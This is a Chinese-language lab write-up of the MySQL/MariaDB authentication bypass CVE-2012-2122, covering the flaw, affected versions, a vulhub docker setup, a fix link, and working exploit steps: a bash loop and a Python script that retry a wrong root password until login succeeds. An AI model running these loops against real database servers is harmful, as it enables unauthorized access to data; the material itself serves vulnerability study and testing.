* [0x01 Mysql 身份认证绕过漏洞(CVE\-2012\-2122)](#0x01-mysql-身份认证绕过漏洞cve-2012-2122)
  * [漏洞简介](#漏洞简介)
  * [影响版本](#影响版本)
  * [环境搭建](#环境搭建)
  * [利用过程](#利用过程)
    * [Metasloit](#metasloit)
    * [bash](#bash)
    * [python](#python)
  * [漏洞修复](#漏洞修复)

------

## 0x01 Mysql 身份认证绕过漏洞(CVE-2012-2122)

### 漏洞简介
**当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。**
**​**

### 影响版本
**MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.**
**MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.**
**​**

### 环境搭建
**环境使用vulhub搭建好的docker**配置：mysql(版本：5.5.23) 账号密码：root/123456**
**​**

### 利用过程
#### Metasloit
```php
msfconsole
```


#### bash
在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：
```php
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 172.21.0.1 -P3306 ; done
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636694326130-f0d1ca46-e39c-4945-ab83-622471c77f4c.png#clientId=ufe2e5dba-77c6-4&from=paste&height=274&id=u53c70f56&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1704&originalType=binary&ratio=1&size=1175687&status=done&style=none&taskId=u7305c43d-d3ea-4468-b39e-ee696d6b016&width=852)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636694362666-708cbba5-3e2b-43d0-86b6-b242d120a12b.png#clientId=ufe2e5dba-77c6-4&from=paste&height=237&id=u48bd8cb8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=474&originWidth=1583&originalType=binary&ratio=1&size=869481&status=done&style=none&taskId=u6ce8ec1b-f776-46e9-9cdf-eb56f4f4958&width=791.5)


#### python
**verify.py**
```php
#!/usr/bin/python
import subprocess
while 1:
        subprocess.Popen("mysql -u root mysql -h 172.21.0.1 --password=baah", shell=True).wait()
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636695018544-a2dd1a50-2198-4534-87df-d94049cfaabe.png#clientId=ufe2e5dba-77c6-4&from=paste&height=281&id=u7697f4c9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=562&originWidth=1681&originalType=binary&ratio=1&size=1054856&status=done&style=none&taskId=u0c57ff83-25e6-4c24-93f7-f4f5828f5e1&width=840.5)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636694989778-2dae2945-0d17-492d-9487-4b85c052c664.png#clientId=ufe2e5dba-77c6-4&from=paste&height=305&id=u996697c2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1668&originalType=binary&ratio=1&size=1101318&status=done&style=none&taskId=u18841840-eb5e-4a2f-8d48-6461fa87ce8&width=834)
### 漏洞修复
**目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：**
[http://www.mysql.com/](http://www.mysql.com/)
